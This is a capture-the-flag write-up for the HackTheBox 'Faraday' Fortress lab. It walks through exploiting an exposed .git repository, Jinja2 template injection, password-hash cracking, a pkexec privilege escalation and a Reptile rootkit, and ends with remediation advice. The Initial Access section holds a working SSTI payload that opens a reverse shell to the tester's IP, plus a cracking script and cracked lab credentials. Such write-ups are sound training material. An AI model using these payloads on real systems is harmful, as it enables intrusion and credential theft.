# HackTheBox - Faraday Writeup

**Machine:** Faraday (HTB Fortress)
**IP Address:** 10.13.37.14
**Difficulty:** Unavailable (Fortress)
**OS:** Linux

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Initial Access](#initial-access)
- [Privilege Escalation - User](#privilege-escalation---user)
- [Privilege Escalation - Root](#privilege-escalation---root)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)
- [Flags](#flags)
- [Remediation Recommendations](#remediation-recommendations)

---

## Reconnaissance

### Port Scan

```bash
nmap 10.13.37.14
```

**Open Ports:**

- 22/tcp (SSH)
- 80/tcp (HTTP)
- 8888/tcp (custom service, credentialed access)

Port 8888 prompted for credentials via netcat.

---

## Initial Access

### Web Registration and SMTP Flag

Registered on the web application and logged in with the new user.

Configured SMTP server to our host on port 25 and started a debug SMTP server:

```bash
sudo python3 -m smtpd -c DebuggingServer -n 10.10.14.10:25
```

Sending a test message yielded a flag via the SMTP alert:

```
FARADAY{ehlo_****w3lcom3!}
```

### Git Exposure and Source Review

Enumerated directories and found exposed `.git`:

```bash
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.13.37.14/FUZZ -t 100 --hc 404
```

Dumped the repository:

```bash
git-dumper http://10.13.37.14/.git/ dump
```

Source review in `app.py` showed use of `render_template_string` with user input, enabling SSTI.

### SSTI to Reverse Shell (Container)

Tested basic SSTI with:

```
http://10.13.37.14/profile?name={{7*7}}
```

Used a Jinja2 payload to execute a reverse shell:

```
{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('bash -c "bash -i >& /dev/tcp/10.10.14.10/443 0>&1"')['read']() == 'chiv' %} a {% endif %}
```

URL-encoded request:

```
http://10.13.37.14/profile?name={%25+if+request['application']['__globals_']['__builtins__']['__import__']('os')['popen']('bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.10/443+0>%261"')['read']()+%3d%3d+'chiv'+%25}+a+{%25+endif+%25}
```

Listener:

```bash
sudo netcat -lvnp 443
```

**Result:** Reverse shell as `root` in a container (`172.22.0.2`) and flag in `/app/flag.txt`:

```
FARADAY{7x7_1********_49}
```

### Database Extraction and Password Cracking

From `/app/db/database.db`, dumped `user_model`:

```bash
sqlite3 database.db
.tables
select * from user_model;
```

Saved hashes to a file and cracked with Python using `check_password_hash`:

```python
#!/usr/bin/python3
from werkzeug.security import check_password_hash
from pwn import log

hashes = open("hashes", "r")

for hash in hashes:
    hash = hash.strip()
    user = hash.split(":")[0]
    hash = hash.split(":")[1]

    with open("/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt", "r", errors="ignore") as file:
        for line in file:
            password = line.strip()
            if check_password_hash(hash, password):
                log.success(f"Credencial valida: {user}:{password}")
```

**Recovered Credentials:**

- `pasta:antihacker`
- `pepe:sarmiento`
- `administrator:ihatepasta`
- `octo:octopass`
- `test:test`

---

## Privilege Escalation - User

### SSH as Pasta

```bash
ssh pasta@10.13.37.14
```

Downloaded `crackme` and reversed it to recover a flag:

```bash
sshpass -p antihacker scp pasta@10.13.37.14:crackme .
```

Bruteforce script for the missing bytes:

```python
#!/usr/bin/python3
from itertools import product
import struct, string

flag = "FARADAY{d0ubl3_********e@uty}"
characters = string.ascii_lowercase + string.punctuation

for combination in product(characters, repeat=5):
    chars = "".join(combination).encode()
    value = b"_" + chars[:2] + b"}" + chars[2:] + b"@"
    result = 1665002837.488342 / struct.unpack("d", value)[0]

    if abs(result - 4088116.817143337) <= 0.0000001192092895507812:
        value = chars[:2] + b"@" + chars[2:] + b"}"
        print(flag + value.decode())
        break
```

Recovered flag:

```
FARADAY{d0ubl3_********e@uty}
```

### SSH as Administrator and Log Mining

```bash
sshpass -p ihatepasta ssh administrator@10.13.37.14
```

Found `access.log` readable and mined SQLmap patterns from `/update.php`:

```bash
cat /var/log/apache2/access.log | grep sqlmap | head -n1
```

Decoded logs with a Python parser:

```python
#!/usr/bin/python3
import re, urllib.parse

with open("/var/log/apache2/access.log") as file:
    for line in file:
        line = urllib.parse.unquote(line)
        if not "update.php" in line:
            continue
        regex = re.search("\)\)!=(\d+)", line)
        if regex:
            decimal = int(regex.group(1))
            print(chr(decimal), end="")
```

Extracted flag:

```
FARADAY{@cc3ss_**********use3fu111}
```

---

## Privilege Escalation - Root

### pkexec (CVE-2021-4034)

Identified `pkexec` SUID and used CVE-2021-4034:

```bash
find / -perm -4000 2>/dev/null | grep -v snap
ls -l /usr/bin/pkexec
python3 exploit.py
```

Root flag:

```
FARADAY{__1s_************l3t3?__}
```

### Port 8888 Flag

Used known SSH credentials on port 8888:

```bash
netcat 10.13.37.14 8888
Username: pasta
Password: antihacker
```

Flag returned:

```
FARADAY{C_1s-************0|3te}
```

### Rootkit Hunt (Reptile)

`chkrootkit` output indicated Reptile rootkit. Mounted the disk image and located the hidden folder:

```bash
sudo losetup /dev/loop10 sda3.image
sudo kpartx -a /dev/loop10
sudo vgdisplay -v | grep "LV Path"
mount /dev/ubuntu-vg/ubuntu-lv /mnt/
```

Found `/mnt/reptileRoberto` and flag file:

```bash
ls -l /mnt/reptileRoberto
```

Disabled rootkit hiding and read the final flag:

```bash
/reptileRoberto/reptileRoberto_cmd show
cat /reptileRoberto/reptileRoberto_flag.txt
```

Flag:

```
FARADAY{__LKM-************0r@ng3__}
```

---

## Key Takeaways

1. Exposed `.git` repositories frequently leak secrets and vulnerable code paths.
2. SSTI via `render_template_string` leads to immediate remote code execution.
3. Credential reuse across services enables fast lateral access.
4. SUID binaries like `pkexec` can enable root via known CVEs.
5. Logs and rootkit artifacts can conceal additional flags and persistence.

---

## Tools Used

- nmap
- netcat
- wfuzz
- git-dumper
- sqlite3
- python3 (smtpd, scripts)
- ssh / sshpass
- netcat
- ida (referenced)
- pkexec exploit (CVE-2021-4034)
- chkrootkit

---

## Flags

- `FARADAY{ehlo_****w3lcom3!}` (SMTP alert)
- `FARADAY{7x7_1********_49}` (container)
- `FARADAY{d0ubl3_********e@uty}` (crackme)
- `FARADAY{@cc3ss_**********use3fu111}` (access.log)
- `FARADAY{__1s_************l3t3?__}` (root)
- `FARADAY{C_1s-************0|3te}` (port 8888)
- `FARADAY{__LKM-************0r@ng3__}` (rootkit)

---

## Remediation Recommendations

### Critical Severity

1. **Remove SSTI in Template Rendering**

   - **Issue:** `render_template_string` used with user-controlled input.
   - **Impact:** Remote code execution and container compromise.
   - **Remediation:**
     - Use safe templating patterns and escape all user input.
     - Disallow user-controlled templates entirely.

2. **Protect Source Code and Secrets**

   - **Issue:** Publicly accessible `.git` directory.
   - **Impact:** Full source leakage and vulnerability discovery.
   - **Remediation:**
     - Block `.git` with web server rules.
     - Remove VCS metadata from web roots.

### High Severity

3. **Eliminate Credential Reuse**

   - **Issue:** Cracked credentials worked for SSH and other services.
   - **Impact:** Lateral movement to real host.
   - **Remediation:**
     - Enforce unique passwords per service and MFA for SSH.

4. **Patch Known SUID Vulnerabilities**

   - **Issue:** `pkexec` vulnerable to CVE-2021-4034.
   - **Impact:** Local privilege escalation to root.
   - **Remediation:**
     - Apply vendor patches and remove unneeded SUID binaries.

### Medium Severity

5. **Limit Log Access and Sensitive Artifacts**

   - **Issue:** Administrator could read web logs containing SQLmap artifacts.
   - **Impact:** Disclosure of hidden data/flags.
   - **Remediation:**
     - Restrict log permissions and sanitize sensitive info.

6. **Detect Rootkits and Hidden Paths**

   - **Issue:** Reptile rootkit present and hiding files.
   - **Impact:** Persistent compromise and hidden data.
   - **Remediation:**
     - Run integrity monitoring and rootkit detection on a schedule.
     - Investigate and remove kernel-level rootkits.
